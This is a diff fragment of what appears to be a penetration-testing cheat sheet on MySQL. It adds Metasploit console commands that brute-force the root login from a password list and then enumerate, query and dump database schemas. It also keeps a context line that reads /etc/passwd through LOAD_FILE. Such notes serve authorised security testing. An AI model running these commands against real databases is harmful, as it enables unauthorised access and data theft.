@@ -49,3 +49,12 @@ by default a `MySQL` installation does not allow arbitrary file read, but if the
 mysql> select LOAD_FILE("/etc/passwd");
 ```
 
+## Msfconsole
+```
+> use scanner/mysql/mysql_login
+> 	set username root
+> 	set pass_file unix_passwords.txt
+> use admin/mysql/mysql_enum
+> use scanner/mysql/mysql_sql
+> use scanner/mysql/mysql_schemadump
+```
